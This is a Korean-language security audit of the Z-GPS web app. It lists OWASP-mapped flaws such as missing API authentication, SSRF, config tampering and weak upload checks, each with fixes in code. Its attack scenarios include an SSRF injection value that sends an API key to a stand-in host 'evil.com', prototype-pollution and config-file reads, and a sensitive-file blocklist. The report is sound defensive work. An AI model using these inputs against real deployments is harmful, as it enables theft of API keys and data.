# Z-GPS 보안 취약점 분석 보고서

> 분석일: 2026-02-17
> 분석 대상: Z-GPS 전체 코드베이스 (Frontend + Backend)
> 분석 도구: OWASP Top 10 (2021) 기반 수동 코드 리뷰

## 요약

| 심각도 | 건수 | 즉시 조치 필요 |
|--------|------|---------------|
| **Critical** | 4건 | 배포 차단, 즉시 수정 |
| **High** | 5건 | 릴리스 전 수정 |
| **Medium** | 5건 | 다음 스프린트 수정 |
| **Low** | 3건 | 백로그 등록 |

**종합 점수: 25/100** (심각한 보안 결함 다수 존재)

---

## CRITICAL 취약점

### C-01. 전체 API 인증/인가 부재 (OWASP A01 + A07)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/routes/vault.ts` (40+ 엔드포인트 전체)
**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/index.ts` (미들웨어 체인)

**현재 상태**: 백엔드 서버의 모든 API 엔드포인트에 인증 미들웨어가 전혀 없다. 누구나 URL만 알면 모든 데이터에 접근 가능하다.

**공격 시나리오**:
1. 공격자가 `https://z-gps-production.up.railway.app/api/vault/company`에 접근하면 기업의 사업자등록번호, 매출액, 직원수, 주소 등 민감 정보를 열람할 수 있다.
2. `POST /api/vault/sync`를 호출하면 서버의 Gemini API 크레딧을 소진시킬 수 있다.
3. `PUT /api/vault/config`로 서버의 API 키를 임의로 변경할 수 있다.
4. `DELETE /api/vault/company/documents/:docId`로 기업 서류를 삭제할 수 있다.

**영향받는 엔드포인트**: `/api/vault/*` 전체 (40+ routes), `/api/gemini/*`, `/api/dart/*`, `/api/odcloud/*`, `/api/data-go/*`

**현재 코드** (`server/src/index.ts` 25-35행):
```typescript
// Middleware - 인증 미들웨어 없음
app.use(createCorsMiddleware());
app.use(express.json({ limit: '50mb' }));

// Routes - 모두 공개 접근
app.use('/api/health', healthRouter);
app.use('/api/vault', vaultRouter);
app.use('/api/gemini', geminiRouter);
```

**수정 코드**:
```typescript
// 1. API 키 기반 인증 미들웨어 추가
import crypto from 'crypto';

const authenticateRequest = (req, res, next) => {
  // Health check는 인증 불필요
  if (req.path === '/api/health') return next();

  const apiToken = req.headers['x-api-token'] || req.headers['authorization']?.replace('Bearer ', '');

  if (!apiToken) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  // 서버 측에 저장된 토큰과 비교 (timing-safe)
  const expectedToken = process.env.API_ACCESS_TOKEN;
  if (!expectedToken || !crypto.timingSafeEqual(
    Buffer.from(apiToken),
    Buffer.from(expectedToken)
  )) {
    return res.status(403).json({ error: 'Invalid token' });
  }

  next();
};

app.use(authenticateRequest);
```

---

### C-02. SSRF (Server-Side Request Forgery) 취약점 (OWASP A10)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/routes/odcloud.ts` (17-21행)

**현재 코드**:
```typescript
const endpointPath = req.query.endpointPath || '/15049270/v1/uddi:...';
const url = `https://api.odcloud.kr/api${endpointPath}?page=${page}&perPage=${perPage}&serviceKey=${encodeURIComponent(apiKey)}`;
const response = await fetch(url);
```

**공격 시나리오**:
1. 공격자가 `endpointPath`에 `@evil.com/steal?key=`를 주입하면 URL이 `https://api.odcloud.kr/api@evil.com/steal?key=...&serviceKey=실제API키`가 되어 API 키가 공격자 서버로 전송된다.
2. `endpointPath`에 내부 네트워크 주소를 삽입하면 서버가 내부 서비스에 요청을 보내게 된다.

**수정 코드**:
```typescript
router.get('/programs', async (req: Request, res: Response) => {
  const apiKey = process.env.ODCLOUD_API_KEY;
  if (!apiKey) {
    res.status(500).json({ error: 'ODCLOUD_API_KEY not configured' });
    return;
  }

  const page = String(req.query.page || '1');
  const perPage = String(req.query.perPage || '500');

  // endpointPath를 화이트리스트로 제한
  const ALLOWED_ENDPOINTS = [
    '/15049270/v1/uddi:6b5d729e-28f8-4404-afae-c3f46842ff11',
    '/15049270/v1/uddi:49607839-e916-4b65-b778-953e5e094627',
  ];

  const endpointPath = String(req.query.endpointPath || ALLOWED_ENDPOINTS[0]);
  if (!ALLOWED_ENDPOINTS.includes(endpointPath)) {
    res.status(400).json({ error: 'Invalid endpoint path' });
    return;
  }

  // page, perPage 숫자 검증
  if (!/^\d+$/.test(page) || !/^\d+$/.test(perPage)) {
    res.status(400).json({ error: 'page and perPage must be numeric' });
    return;
  }

  const url = `https://api.odcloud.kr/api${endpointPath}?page=${page}&perPage=${perPage}&serviceKey=${encodeURIComponent(apiKey)}`;
  // ...
});
```

---

### C-03. 임의 API 키 주입 및 서버 설정 변조 (OWASP A01 + A08)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/routes/vault.ts` (2323-2354행)
**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/routes/gemini.ts` (83-112행)

**현재 코드 (vault.ts)**:
```typescript
router.put('/config', async (req: Request, res: Response) => {
  const updates = req.body as Record<string, unknown>;
  // ...
  Object.assign(config, updates);  // 임의 키-값을 config.json에 저장

  if (updates.geminiApiKey && typeof updates.geminiApiKey === 'string') {
    process.env.GEMINI_API_KEY = updates.geminiApiKey;  // 런타임 env 변조!
  }
  if (updates.dartApiKey) { process.env.DART_API_KEY = updates.dartApiKey; }
  if (updates.dataGoKrApiKey) { process.env.DATA_GO_KR_API_KEY = updates.dataGoKrApiKey; }
});
```

**현재 코드 (gemini.ts 86행)**:
```typescript
const testKey = (req.body as { apiKey?: string }).apiKey || apiKey;
// 사용자가 보낸 임의의 API 키로 Gemini API 호출
const ai = new GoogleGenAI({ apiKey: testKey.trim() });
```

**공격 시나리오**:
1. `PUT /api/vault/config`로 `geminiApiKey`를 공격자의 키로 변경하면, 이후 모든 AI 분석 요청이 공격자가 제어하는 Gemini 계정을 통해 이뤄진다 (데이터 탈취 가능).
2. `/api/gemini/verify`에 도난당한 API 키를 전달하면 키의 유효성을 검증하는 oracle로 악용된다.
3. `Object.assign(config, updates)`에 `__proto__` 등을 삽입하면 프로토타입 오염 공격이 가능하다.

**수정 코드**:
```typescript
// 1. config 업데이트 시 허용 키 화이트리스트 적용
const ALLOWED_CONFIG_KEYS = ['geminiApiKey', 'dartApiKey', 'dataGoKrApiKey'];

router.put('/config', authenticateRequest, async (req: Request, res: Response) => {
  const updates = req.body as Record<string, unknown>;
  const configPath = path.join(getVaultRoot(), 'config.json');

  let config: Record<string, unknown> = {};
  try {
    const raw = await fs.readFile(configPath, 'utf-8');
    config = JSON.parse(raw);
  } catch { /* 첫 저장 */ }

  // 화이트리스트 필터링 + 프로토타입 오염 방지
  for (const key of ALLOWED_CONFIG_KEYS) {
    if (key in updates && typeof updates[key] === 'string') {
      config[key] = updates[key];
    }
  }

  await fs.writeFile(configPath, JSON.stringify(config, null, 2), 'utf-8');
  // process.env 업데이트도 화이트리스트 내에서만
  // ...
  res.json({ success: true });
});

// 2. /verify 엔드포인트에서 외부 키 수신 제거
router.post('/verify', async (req: Request, res: Response) => {
  const apiKey = process.env.GEMINI_API_KEY;
  // 외부에서 받은 키는 사용하지 않음
  if (!apiKey || apiKey.trim().length < 10) {
    res.json({ success: false, message: 'API Key가 서버에 설정되지 않았습니다.' });
    return;
  }
  // ...
});
```

---

### C-04. 서버 에러 메시지를 통한 내부 정보 노출 (OWASP A04 + A05)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/routes/gemini.ts` (74-75행)
**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/routes/vault.ts` (다수 catch 블록)

**현재 코드**:
```typescript
// gemini.ts - 에러 문자열을 클라이언트에 그대로 반환
const shortErr = errStr.length > 200 ? errStr.substring(0, 200) + '...' : errStr;
res.status(500).json({ error: `Gemini API 호출 실패: ${shortErr}` });

// vault.ts - details에 에러 전체를 포함
res.status(500).json({ error: '섹션 분석 실패', details: String(error) });
res.status(500).json({ error: '서류 업로드 실패', details: String(error) });
```

**공격 시나리오**: 에러 메시지에 서버 내부 경로, API 키 일부, 스택 트레이스가 포함될 수 있다. 공격자가 의도적으로 잘못된 요청을 보내면 시스템 구조를 파악할 수 있다.

**수정 코드**:
```typescript
// 공통 에러 핸들러
function safeErrorResponse(res: Response, userMessage: string, error: unknown, statusCode = 500) {
  // 서버 로그에만 상세 에러 기록
  console.error(`[ERROR] ${userMessage}:`, error);

  // 클라이언트에는 최소한의 정보만 반환
  res.status(statusCode).json({
    error: userMessage,
    code: `ERR_${statusCode}`,
  });
}
```

---

## HIGH 취약점

### H-01. Rate Limiting 부재 (OWASP A05)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/index.ts`
**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/package.json`

**현재 상태**: `express-rate-limit` 또는 유사 라이브러리가 설치되어 있지 않다. 모든 엔드포인트가 무제한 호출 가능하다.

**공격 시나리오**:
1. `/api/gemini/generate`를 초당 수백 회 호출하면 Gemini API 크레딧이 수 분 내 소진된다.
2. `/api/vault/sync`를 반복 호출하면 서버가 수십 개의 외부 API + 크롤링을 동시 실행하여 서비스 거부(DoS)가 된다.
3. `/api/vault/company/research`를 반복 호출하면 Gemini 비용이 급증한다.

**수정 코드**:
```bash
cd server && npm install express-rate-limit
```

```typescript
// server/src/index.ts
import rateLimit from 'express-rate-limit';

// 전역 Rate Limiter
const globalLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1분
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests. Please try again later.' },
});

// Gemini 전용 (비용 보호)
const geminiLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 20,
  message: { error: 'AI API rate limit exceeded.' },
});

app.use(globalLimiter);
app.use('/api/gemini', geminiLimiter);
```

---

### H-02. 보안 헤더 미설정 (OWASP A05)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/index.ts`

**현재 상태**: `helmet` 패키지가 설치되어 있지 않다. 다음 보안 헤더가 모두 누락되어 있다:
- `Strict-Transport-Security` (HSTS)
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Content-Security-Policy`
- `Referrer-Policy`

**수정 코드**:
```bash
cd server && npm install helmet
```

```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
    },
  },
  hsts: { maxAge: 63072000, includeSubDomains: true },
}));
```

---

### H-03. 클라이언트 localStorage에 API 키 평문 저장 (OWASP A02 + A04)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/services/storageService.ts` (44-74행)

**현재 코드**:
```typescript
const KEYS = {
  API_KEY: 'zmis_user_api_key',    // Gemini API Key
  DART_KEY: 'zmis_user_dart_key',   // DART API Key
  NPS_KEY: 'zmis_user_nps_key',     // NPS API Key
};

export const saveStoredApiKey = (key: string) => {
  localStorage.setItem(KEYS.API_KEY, key);  // 평문 저장!
};
```

**공격 시나리오**:
1. XSS 취약점이 하나라도 있으면 `localStorage.getItem('zmis_user_api_key')`로 모든 API 키를 탈취할 수 있다.
2. 브라우저 개발자 도구에서 누구나 키를 확인할 수 있다.
3. 공유 컴퓨터에서 다른 사용자가 키를 열람할 수 있다.

**수정 방향**: API 키는 서버에만 저장하고, 클라이언트에서는 세션 토큰만 관리해야 한다. 현재 `PUT /api/vault/config`를 통해 서버 config.json에 저장하는 경로가 이미 있으므로, 클라이언트 측 키 저장을 제거하고 서버 측 관리로 전환한다.

---

### H-04. JSON Body 50MB 제한으로 인한 DoS 가능성 (OWASP A05)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/index.ts` (27행)

**현재 코드**:
```typescript
app.use(express.json({ limit: '50mb' }));
```

**공격 시나리오**: 50MB JSON payload를 반복 전송하면 서버 메모리가 빠르게 고갈되어 서비스 거부 상태가 된다.

**수정 코드**:
```typescript
// 일반 API: 1MB 제한
app.use(express.json({ limit: '1mb' }));

// 파일 업로드가 필요한 특정 라우트에만 큰 제한 적용
router.post('/company/documents',
  express.json({ limit: '10mb' }),
  async (req, res) => { /* ... */ }
);
```

---

### H-05. .env.example에 VITE_ 접두사 API 키 잔존 (OWASP A02)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/.env.example` (3, 7, 15행)

**현재 코드**:
```env
VITE_GEMINI_API_KEY=your_gemini_api_key_here
VITE_ODCLOUD_API_KEY=your_odcloud_api_key_here
VITE_DART_API_KEY=your_dart_api_key_here
```

**위험**: `VITE_` 접두사가 붙은 환경 변수는 Vite 빌드 시 클라이언트 번들에 포함된다. 개발자가 이 파일을 참고하여 `.env`에 실제 API 키를 입력하면 프로덕션 빌드에 키가 노출된다.

CLAUDE.md에도 "API 키는 서버사이드 only -- 프론트엔드에 노출 금지"라고 명시되어 있으나, `.env.example`이 이 규칙과 모순된다.

**수정 코드**:
```env
# Frontend Environment Variables
# API 키는 서버(.env)에만 설정하세요! 프론트엔드에 키를 넣지 마세요.
VITE_API_BASE_URL=http://localhost:5001
VITE_ODCLOUD_ENDPOINT_PATH=/15049270/v1/uddi:49607839-e916-4b65-b778-953e5e094627

# WARNING: 아래 변수들은 더 이상 사용되지 않습니다. server/.env에 설정하세요.
# VITE_GEMINI_API_KEY (제거됨 -> server/.env의 GEMINI_API_KEY 사용)
# VITE_ODCLOUD_API_KEY (제거됨 -> server/.env의 ODCLOUD_API_KEY 사용)
# VITE_DART_API_KEY (제거됨 -> server/.env의 DART_API_KEY 사용)
```

---

## MEDIUM 취약점

### M-01. CORS 미들웨어 - origin 없는 요청 무조건 허용 (OWASP A05)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/middleware/cors.ts` (9-11행)

**현재 코드**:
```typescript
origin: (origin, callback) => {
  // Allow requests with no origin (mobile apps, curl, etc.)
  if (!origin) return callback(null, true);
```

**위험**: `Origin` 헤더가 없는 모든 요청(curl, Postman, 서버 간 요청)을 무조건 허용한다. 이는 C-01의 인증 부재와 결합되어 누구나 API를 호출할 수 있다는 의미이다.

**수정 코드**:
```typescript
origin: (origin, callback) => {
  // 인증이 있는 경우에만 no-origin 허용 (서버-서버 통신)
  // 브라우저 요청은 반드시 origin이 있음
  if (!origin) {
    // 개발 환경에서만 허용, 프로덕션에서는 차단
    if (process.env.NODE_ENV === 'production') {
      return callback(new Error('Origin header required'));
    }
    return callback(null, true);
  }
  if (allowedOrigins.includes(origin)) {
    return callback(null, true);
  }
  callback(new Error(`CORS: Origin ${origin} not allowed`));
},
```

---

### M-02. 파일 업로드 검증 부족 (OWASP A04 + A08)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/routes/vault.ts` (2915-2958행)

**현재 코드**:
```typescript
router.post('/company/documents', async (req, res) => {
  const { name, fileName, fileData } = req.body as {
    name: string;
    fileName: string;
    fileData: string; // base64
  };
  // name, fileName 존재 여부만 확인
  // 파일 타입, 크기, 내용 검증 없음
  const buffer = Buffer.from(fileData, 'base64');
  await writeBinaryFile(filePath, buffer);
});
```

**공격 시나리오**:
1. 악성 실행 파일을 base64로 인코딩하여 업로드할 수 있다.
2. 50MB base64 문자열을 전송하면 디코딩 시 ~37.5MB 파일이 서버에 저장된다.
3. `fileName`에 경로 구분자를 포함시킬 수 있다 (sanitizeFileName이 있지만 검증 범위가 불분명하다).

**수정 코드**:
```typescript
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB
const ALLOWED_EXTENSIONS = ['pdf', 'hwp', 'hwpx', 'docx', 'doc', 'xlsx', 'xls', 'jpg', 'jpeg', 'png'];

router.post('/company/documents', async (req, res) => {
  const { name, fileName, fileData } = req.body;

  if (!name || !fileName || !fileData) {
    return res.status(400).json({ error: 'name, fileName, fileData가 필요합니다.' });
  }

  // 확장자 검증
  const ext = fileName.split('.').pop()?.toLowerCase() || '';
  if (!ALLOWED_EXTENSIONS.includes(ext)) {
    return res.status(400).json({ error: `허용되지 않는 파일 형식입니다: ${ext}` });
  }

  // 크기 검증 (base64는 원본의 ~1.33배)
  if (fileData.length > MAX_FILE_SIZE * 1.34) {
    return res.status(413).json({ error: '파일 크기가 10MB를 초과합니다.' });
  }

  const buffer = Buffer.from(fileData, 'base64');

  // 실제 바이트 크기 확인
  if (buffer.length > MAX_FILE_SIZE) {
    return res.status(413).json({ error: '파일 크기가 10MB를 초과합니다.' });
  }

  // magic bytes로 실제 파일 타입 검증
  const magicCheck = detectRealFileType(buffer);
  if (!ALLOWED_EXTENSIONS.includes(magicCheck)) {
    return res.status(400).json({ error: '파일 내용이 확장자와 일치하지 않습니다.' });
  }

  // ...
});
```

---

### M-03. CSRF 보호 없음 (OWASP A01)

**현재 상태**: 프론트엔드와 백엔드 모두 CSRF 토큰을 구현하고 있지 않다. CORS에 `credentials: true`가 설정되어 있으므로, 공격자 사이트에서 인증된 사용자의 브라우저를 통해 API 호출이 가능하다.

현재는 C-01의 인증 자체가 없으므로 CSRF가 별도 위협이 되지 않지만, 인증을 도입한 이후에는 반드시 CSRF 방어를 함께 구현해야 한다.

**수정 방향**: 인증 구현 후 `SameSite=Strict` 쿠키 또는 CSRF 토큰 기반 방어를 추가한다.

---

### M-04. Vault 파일 서빙 경로 순회 불완전 방어 (OWASP A01)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/routes/vault.ts` (3053-3091행)

**현재 코드**:
```typescript
router.get('/attachment/*', async (req, res) => {
  const filePath = req.params[0] || '';
  if (!filePath || filePath.includes('..')) {  // 기본 방어
    res.status(400).json({ error: '잘못된 경로입니다.' });
    return;
  }

  const vaultRoot = getVaultRoot();
  const fullPath = path.join(vaultRoot, filePath);
  const resolved = path.resolve(fullPath);
  if (!resolved.startsWith(path.resolve(vaultRoot))) {  // 추가 방어
    res.status(403).json({ error: '접근 권한이 없습니다.' });
    return;
  }
  // ...
  const fileBuffer = await fs.readFile(fullPath);
  res.send(fileBuffer);
});
```

**평가**: `..` 필터와 `path.resolve` 검증이 둘 다 적용되어 있어 기본적인 Path Traversal은 방어된다. 그러나 다음 문제가 남아있다:
1. 인증 없이 vault 내 모든 파일을 읽을 수 있다 (C-01과 연결).
2. config.json이 vault 루트에 있으므로 `/api/vault/attachment/config.json`으로 API 키가 담긴 설정 파일을 읽을 수 있다.

**수정 코드**:
```typescript
router.get('/attachment/*', authenticateRequest, async (req, res) => {
  const filePath = req.params[0] || '';

  // 민감 파일 차단
  const BLOCKED_PATTERNS = ['config.json', '.obsidian', '.env'];
  if (BLOCKED_PATTERNS.some(p => filePath.includes(p))) {
    return res.status(403).json({ error: '접근이 차단된 파일입니다.' });
  }
  // ... 기존 path traversal 방어 유지
});
```

---

### M-05. 프론트엔드 인증이 localStorage 기반 (OWASP A07)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/services/storageService.ts` (17-41행)

**현재 코드**:
```typescript
export const loginUser = (id: string) => {
  localStorage.setItem(KEYS.AUTH_SESSION, JSON.stringify({
    userId: id,
    loginTime: new Date().toISOString(),
    isLoggedIn: true
  }));
};

export const isAuthenticated = (): boolean => {
  const session = localStorage.getItem(KEYS.AUTH_SESSION);
  if (!session) return false;
  const parsed = JSON.parse(session);
  return parsed.isLoggedIn;
};
```

**문제점**:
1. 세션 만료 시간이 없다 (영구 로그인).
2. 사업자등록번호만으로 로그인되며 비밀번호가 없다.
3. localStorage는 JavaScript로 자유롭게 조작 가능하다.
4. 이 "인증"은 순수 클라이언트 사이드이며, 백엔드에는 전달되지 않는다 (C-01 참조).

**수정 방향**: 세션 만료 시간 추가, 서버 측 세션 검증 도입, httpOnly 쿠키 기반 인증 전환.

---

## LOW 취약점

### L-01. 외부 URL 크롤링 시 타임아웃/검증 부재 (OWASP A10)

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/src/services/deepCrawler.ts`

`fetch(detailUrl)`로 외부 URL을 크롤링할 때 타임아웃이 설정되어 있지 않고, 대상 URL이 내부 네트워크 주소인지 검증하지 않는다. `detailUrl`은 외부 API에서 받은 값이므로 직접적인 사용자 입력은 아니지만, 공급망 공격으로 악성 URL이 삽입될 가능성이 있다.

**수정**: `AbortController`로 10초 타임아웃 설정, 내부 IP 대역 차단 로직 추가.

---

### L-02. console.error에 민감 정보 기록 가능성 (OWASP A09)

**다수 파일**: vault.ts, gemini.ts 등의 catch 블록

```typescript
console.error('[vault/analyze-all] Error:', error);
console.error('[dart] Proxy error:', error);
```

프로덕션 환경에서 에러 객체를 그대로 출력하면 API 키, 내부 경로, 사용자 데이터가 로그에 기록될 수 있다. Railway 같은 PaaS 로그는 팀 전체가 볼 수 있다.

**수정**: 구조화된 로깅 라이브러리(winston, pino) 도입, 민감 데이터 마스킹.

---

### L-03. 의존성 보안 점검 미실시

**파일**: `/mnt/c/Users/kkoki/GitHub/Z-GPS/server/package.json`

`pdf-parse@2.4.5`는 과거 취약점 보고 이력이 있다. `npm audit`를 정기적으로 실행하는 CI/CD 파이프라인이 없다.

**수정**: `npm audit` 및 `npm audit fix`를 CI에 통합, Dependabot 또는 Renovate 설정.

---

## OWASP Top 10 매핑 요약

| OWASP ID | 카테고리 | 해당 취약점 | 심각도 |
|----------|---------|------------|--------|
| **A01** | Broken Access Control | C-01 (인증 없음), C-03 (설정 변조), M-03 (CSRF), M-04 (파일 접근) | Critical/Medium |
| **A02** | Cryptographic Failures | H-03 (localStorage 평문 키), H-05 (VITE_ 키 노출) | High |
| **A03** | Injection | C-02 (SSRF URL 주입) | Critical |
| **A04** | Insecure Design | C-04 (에러 노출), M-02 (파일 업로드), M-05 (클라이언트 인증) | Critical/Medium |
| **A05** | Security Misconfiguration | H-01 (Rate Limit 없음), H-02 (보안 헤더 없음), H-04 (50MB 제한), M-01 (CORS) | High/Medium |
| **A06** | Vulnerable Components | L-03 (의존성) | Low |
| **A07** | Auth Failures | C-01 (인증 없음), M-05 (localStorage 세션) | Critical/Medium |
| **A08** | Data Integrity | C-03 (API 키 주입) | Critical |
| **A09** | Logging Failures | L-02 (민감 데이터 로깅) | Low |
| **A10** | SSRF | C-02 (endpointPath), L-01 (크롤 URL) | Critical/Low |

---

## 우선순위별 수정 로드맵

### Phase 1 - 즉시 (배포 전 필수)
1. [C-01] 백엔드 API 인증 미들웨어 추가
2. [C-02] ODCloud `endpointPath` 화이트리스트 적용
3. [C-03] `/api/vault/config` 화이트리스트 + 프로토타입 오염 방지
4. [H-01] `express-rate-limit` 설치 및 적용

### Phase 2 - 1주 이내
5. [C-04] 에러 메시지 최소화 (공통 에러 핸들러)
6. [H-02] `helmet` 설치 및 보안 헤더 적용
7. [H-04] JSON body limit 1MB로 축소, 파일 업로드 라우트만 별도 제한
8. [H-05] `.env.example`에서 VITE_API_KEY 참조 제거

### Phase 3 - 2주 이내
9. [H-03] API 키를 서버 측으로 이동, 클라이언트 localStorage에서 제거
10. [M-01] CORS origin 검증 강화
11. [M-02] 파일 업로드 타입/크기 검증 강화
12. [M-04] config.json 등 민감 파일 접근 차단

### Phase 4 - 다음 스프린트
13. [M-03] CSRF 보호 구현
14. [M-05] 서버 측 세션 관리 전환
15. [L-01~L-03] 크롤 타임아웃, 구조화 로깅, 의존성 감사

---

## 참고: 보안 아키텍처 권장 구조

```
Client (Browser)
  |
  |-- [HTTPS] --> Vercel (Static Frontend)
  |                   |
  |                   |-- [API Rewrite] --> Railway (Express Backend)
  |                                           |
  |                                           |-- [Auth Middleware] --> 토큰 검증
  |                                           |-- [Rate Limiter] --> 요청 제한
  |                                           |-- [Helmet] --> 보안 헤더
  |                                           |-- [Input Validation] --> zod 스키마
  |                                           |-- [CORS] --> 허용 origin만
  |                                           |
  |                                           |-- External APIs (Gemini, DART, ODCloud)
  |                                           |   (API 키: process.env only)
  |                                           |
  |                                           |-- Vault Filesystem
  |                                               (config.json 접근 차단)
```
